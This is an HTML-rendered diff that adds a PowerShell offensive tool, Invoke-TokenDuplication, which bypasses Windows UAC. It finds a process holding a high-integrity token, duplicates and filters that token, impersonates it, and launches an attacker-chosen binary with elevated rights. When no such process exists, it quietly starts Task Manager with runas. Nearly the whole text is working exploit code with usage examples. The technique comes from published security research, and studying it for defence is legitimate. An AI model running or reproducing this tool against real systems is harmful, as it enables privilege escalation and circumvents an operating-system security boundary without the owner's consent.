+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [IntPtr].MakeByRefType()         <br/>
+  ) -EntryPoint AllocateAndInitializeSid -SetLastError),<br/>
+<br/>
+  (func advapi32 ImpersonateLoggedOnUser ([bool]) @(<br/>
+    [IntPtr]<br/>
+  )-EntryPoint ImpersonateLoggedOnUser -SetLastError),<br/>
+<br/>
+  (func advapi32 CreateProcessWithLogonW ([bool]) @(<br/>
+    [String],<br/>
+    [String],<br/>
+    [String],<br/>
+    [UInt32],<br/>
+    [String],<br/>
+    [String],<br/>
+    [UInt32],<br/>
+    [UInt32],<br/>
+    [String],<br/>
+    [IntPtr],<br/>
+    [IntPtr].MakeByRefType()<br/>
+  )-EntryPoint CreateProcessWithLogonW -SetLastError),<br/>
+<br/>
+<br/>
+  (func kernel32 OpenProcess ([IntPtr]) @(<br/>
+    [UInt32],<br/>
+    [bool],<br/>
+    [UInt32]<br/>
+  )-EntryPoint OpenProcess -SetLastError),<br/>
+<br/>
+  (func kernel32 TerminateProcess ([bool]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32]<br/>
+  )-EntryPoint TerminateProcess -SetLastError),<br/>
+<br/>
+  (func ntdll NtSetInformationToken ([int]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [IntPtr],<br/>
+    [UInt32]<br/>
+  )-EntryPoint NtSetInformationToken -SetLastError),<br/>
+<br/>
+  (func ntdll NtFilterToken ([int]) @(<br/>
+    [IntPtr],<br/>
+    [UInt32],<br/>
+    [IntPtr],<br/>
+    [IntPtr],<br/>
+    [IntPtr],<br/>
+    [IntPtr].MakeByRefType()<br/>
+  )-EntryPoint NtFilterToken -SetLastError)<br/>
+<br/>
+<br/>
+<br/>
+)<br/>
+<br/>
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'<br/>
+$Advapi32 = $Types['advapi32']<br/>
+$Kernel32 = $Types['kernel32']<br/>
+$ntdll = $Types['ntdll']<br/>
+<br/>
+<br/>
+<br/>
+function EnumProcesses(){<br/>
+	Get-Process | %{<br/>
+		# Get handle to the process<br/>
+		$ProcHandle = $Kernel32::OpenProcess(0x00001000, $false, $_.Id)<br/>
+		if($ProcHandle -eq 0){<br/>
+			#echo &quot;[!] Unable to open process`n&quot;<br/>
+			return<br/>
+		}<br/>
+<br/>
+		# Get handle to the process token<br/>
+		$hTokenHandle = 0<br/>
+		$CallResult = $Advapi32::OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)<br/>
+		if($CallResult -eq 0){<br/>
+			return<br/>
+		}	<br/>
+			<br/>
+		# Call GetTokenInformation with TokenInformationClass = 25 (TokenIntegrityLevel)<br/>
+		[int]$Length = 0<br/>
+		$CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)<br/>
+			<br/>
+		# After we get the buffer length alloc and call again<br/>
+		[IntPtr]$TokenInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Length)<br/>
+		$CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)<br/>
+			<br/>
+		[System.IntPtr] $pSid1 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($TokenInformation)<br/>
+		[int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([System.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))<br/>
+		if($IntegrityLevel -eq 12288){<br/>
+			return [int]$_.Id<br/>
+		}<br/>
+	}<br/>
+}<br/>
+<br/>
+function ElevateProcess($HIProc,$Binary, $Arguments){<br/>
+  $PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000<br/>
+  $bInheritHandle = $false<br/>
+	$hProcess = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $bInheritHandle, $HIProc[0])	<br/>
+	if ($hProcess -ne 0) {<br/>
+			Write-Verbose &quot;[*] Successfully acquired $((Get-Process -Id $HIProc).Name) handle&quot;<br/>
+		} else {<br/>
+			Write-Verbose &quot;[!] Failed to get process token!`n&quot;<br/>
+			Break<br/>
+		}<br/>
+	$hToken = [IntPtr]::Zero<br/>
+	<br/>
+	if($Advapi32::OpenProcessToken($hProcess, 0x02000000, [ref]$hToken)) {<br/>
+		Write-Verbose &quot;[*] Opened process token&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed open process token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+<br/>
+<br/>
+	$hNewToken = [IntPtr]::Zero	<br/>
+	$SEC_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)<br/>
+  [IntPtr]$SEC_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($SEC_ATTRIBUTES_Struct, $SEC_ATTRIBUTES_PTR,$False)<br/>
+	if($Advapi32::DuplicateTokenEx($hToken,0xf01ff,$SEC_ATTRIBUTES_PTR,2,1,[ref]$hNewToken)) {<br/>
+		Write-Verbose &quot;[*] Duplicated process token&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed to duplicate process token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	$SIA_Struct = [Activator]::CreateInstance($SID_IDENTIFIER_AUTHORITY)<br/>
+  #0x10 == SECURITY_MANDATORY_LABEL_AUTHORITY <br/>
+  $SIA_Struct.Value = [byte[]](0x0, 0x0, 0x0, 0x0, 0x0, 0x10)<br/>
+<br/>
+  [IntPtr]$SIA_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_IDENTIFIER_AUTHORITY::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($SIA_Struct,$SIA_PTR,$False)<br/>
+	$pSid = [System.IntPtr]::Zero<br/>
+<br/>
+	$Advapi32::AllocateAndInitializeSid($SIA_PTR,1,0x2000,0,0,0,0,0,0,0,[ref]$pSid)<br/>
+<br/>
+<br/>
+<br/>
+	$SID_AND_ATTRIBUTES_Struct = [Activator]::CreateInstance($SID_AND_ATTRIBUTES)<br/>
+  $SID_AND_ATTRIBUTES_Struct.Sid = $pSid<br/>
+  $SID_AND_ATTRIBUTES_Struct.Attributes = 0x20<br/>
+  [IntPtr]$SID_AND_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_AND_ATTRIBUTES::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($SID_AND_ATTRIBUTES_Struct, $SID_AND_ATTRIBUTES_PTR,$False)<br/>
+	$TOKEN_MANDATORY_LABEL_Struct = [Activator]::CreateInstance($TOKEN_MANDATORY_LABEL)<br/>
+  $TOKEN_MANDATORY_LABEL_Struct.Label = $SID_AND_ATTRIBUTES_Struct<br/>
+  [IntPtr]$TOKEN_MANDATORY_LABEL_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TOKEN_MANDATORY_LABEL::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($TOKEN_MANDATORY_LABEL_Struct, $TOKEN_MANDATORY_LABEL_PTR,$False)<br/>
+  $TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL_Struct)<br/>
+<br/>
+	if($ntdll::NtSetInformationToken($hNewToken,25,$TOKEN_MANDATORY_LABEL_PTR,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {<br/>
+		Write-Verbose &quot;[*] Lowered token mandatory IL&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed modify token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	[IntPtr]$LUAToken = [System.IntPtr]::Zero<br/>
+	if($ntdll::NtFilterToken($hNewToken,4,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[ref]$LUAToken) -eq 0) {<br/>
+		Write-Verbose &quot;[*] Created restricted token&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed to create restricted token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	[IntPtr]$hNewToken = [System.IntPtr]::Zero<br/>
+	$NEW_SECURITY_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)<br/>
+  [IntPtr]$NEW_SECURITY_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($NEW_SECURITY_ATTRIBUTES_Struct, $NEW_SECURITY_ATTRIBUTES_PTR,$False)<br/>
+	if($Advapi32::DuplicateTokenEx($LUAToken,0xc,$NEW_SECURITY_ATTRIBUTES_PTR,2,2,[ref]$hNewToken)){<br/>
+		Write-Verbose &quot;[*] Duplicated restricted token&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed to duplicate restricted token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	if($Advapi32::ImpersonateLoggedOnUser($hNewToken)){<br/>
+		Write-Verbose &quot;[*] Successfully impersonated security context&quot;<br/>
+	} else {<br/>
+		Write-Verbose &quot;[!] Failed impersonate context!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+<br/>
+	$STARTUP_INFO_STRUCT = [Activator]::CreateInstance($STARTUPINFO)<br/>
+  $STARTUP_INFO_STRUCT.dwFlags = 0x00000001 <br/>
+  $STARTUP_INFO_STRUCT.wShowWindow = 0x0001<br/>
+  $STARTUP_INFO_STRUCT.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUP_INFO_STRUCT)<br/>
+  [IntPtr]$STARTUP_INFO_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($STARTUP_INFO_STRUCT,$STARTUP_INFO_PTR,$false)<br/>
+	$PROCESS_INFORMATION_STRUCT = [Activator]::CreateInstance($PROCESS_INFORMATION)<br/>
+  [IntPtr]$PROCESS_INFORMATION_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION::GetSize())<br/>
+  [Runtime.InteropServices.Marshal]::StructureToPtr($PROCESS_INFORMATION_STRUCT,$PROCESS_INFORMATION_PTR,$false)<br/>
+	$path = $Env:SystemRoot<br/>
+	$advapi32::CreateProcessWithLogonW(&quot;l&quot;,&quot;o&quot;,&quot;l&quot;,0x00000002,$Binary,$Binary + &quot; &quot; + $Arguments,0x04000000,$null,$path,$STARTUP_INFO_PTR,[ref]$PROCESS_INFORMATION_PTR)<br/>
+<br/>
+<br/>
+<br/>
+}<br/>
+<br/>
+function Invoke-TokenDuplication {<br/>
+&lt;#<br/>
+  .SYNOPSIS<br/>
+    Bypasses UAC by Duplicating a HI security access token and calling CreateProcessWithLogonW() <br/>
+    Author: Matt Nelson (@enigma0x3), James Forshaw (@tiraniddo) and Ruben Boonen (@fuzzySec)<br/>
+    License: BSD 3-Clause<br/>
+    Required Dependencies: None<br/>
+    Optional Dependencies: None<br/>
+  .DESCRIPTION<br/>
+   This function will enumerate the process listing for any processes that have a HI security access token.<br/>
+   If one is identified, it will Duplicate that token, apply it to the current thread and then call<br/>
+   CreateProcessWithLogonW() to start a new process with that HI security access token. If a HI token is not <br/>
+   found, the function will start one via the &quot;RunAs&quot; verb for TaskMgr.exe, loop the process list again and <br/>
+   Duplicate any newly found HI security access tokens.<br/>
+<br/>
+  .PARAMETER Binary<br/>
+   Should exist in System32. If it doesn't, modify the path.<br/>
+<br/>
+  .PARAMETER Arguments<br/>
+   Any arguments that follow the binary entered.<br/>
+<br/>
+  .PARAMETER ProcID<br/>
+   Process ID of a proc with a HI security access token applied. This will use a specified process<br/>
+   instead of looping the process list.<br/>
+<br/>
+  .EXAMPLE<br/>
+    Invoke-TokenDuplication -Binary &quot;cmd.exe&quot; -Arguments &quot;/c calc.exe&quot; -Verbose<br/>
+    Loops the proccess list, duplicates a HI token and starts cmd.exe /c calc.exe with that token.<br/>
+<br/>
+  .EXAMPLE<br/>
+    Invoke-TokenDuplication -Binary &quot;cmd.exe&quot; -Arguments &quot;/c calc.exe&quot; -ProcID 1128 -Verbose<br/>
+    Uses Process ID 1128 to duplicate the token and start cmd.exe /c calc.exe with that token.<br/>
+<br/>
+  .LINK<br/>
+  https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-1.html<br/>
+  https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html<br/>
+  https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-3.html<br/>
+  https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1<br/>
+#&gt;<br/>
+param(<br/>
+		[Parameter(Mandatory = $True)]<br/>
+		[String]$Binary,<br/>
+		[Parameter(Mandatory = $False)]<br/>
+		[String]$Arguments,<br/>
+		[Parameter(Mandatory = $False)]<br/>
+		[int]$ProcID<br/>
+	)<br/>
+<br/>
+<br/>
+  if(!$ProcID){<br/>
+    $VerbosePreference = &quot;continue&quot;<br/>
+    Write-Verbose &quot;Enumerating Process list...&quot;<br/>
+    $HIProc = @(EnumProcesses)<br/>
+    if($HIProc.count -eq 0){<br/>
+      Write-Verbose &quot;No HI process available, starting one...&quot;<br/>
+      $StartInfo = New-Object Diagnostics.ProcessStartInfo<br/>
+      $StartInfo.FileName = &quot;TaskMgr.exe&quot;<br/>
+      $StartInfo.UseShellExecute = $true<br/>
+      $StartInfo.Verb = &quot;runas&quot;<br/>
+      $Startinfo.WindowStyle = 'Hidden'<br/>
+      $Startinfo.CreateNoWindow = $True<br/>
+      $Process = New-Object Diagnostics.Process<br/>
+      $Process.StartInfo = $StartInfo<br/>
+      $null = $Process.Start()<br/>
+      Write-Verbose &quot;Enumerating Process list again...&quot;<br/>
+      $HIProc = EnumProcesses<br/>
+      Write-Verbose &quot;HI Process found. PID: $HIProc&quot;<br/>
+      Write-Verbose &quot;DuplicatingToken from $HIProc&quot;<br/>
+      Write-Verbose $Binary<br/>
+      $null = ElevateProcess $HIProc $Binary $Arguments<br/>
+      Write-Verbose &quot;Sleeping 5 seconds...&quot;<br/>
+      Start-sleep 5<br/>
+      Write-Verbose &quot;Killing the newly created process&quot;<br/>
+      $null = $Kernel32::TerminateProcess($Process.Handle,1)<br/>
+    }else{<br/>
+      Write-Verbose &quot;HI Proc found. ID: $HIProc&quot;<br/>
+      ElevateProcess $HIProc $Binary $Arguments<br/>
+    }<br/>
+  }else{<br/>
+    Write-Verbose &quot;Elevating $ProcID&quot;<br/>
+    ElevateProcess $ProcID $Binary $Arguments<br/>
+  }<br/>
+	<br/>
+	<br/>
+}<br/>
+<br/>
+</body></html>
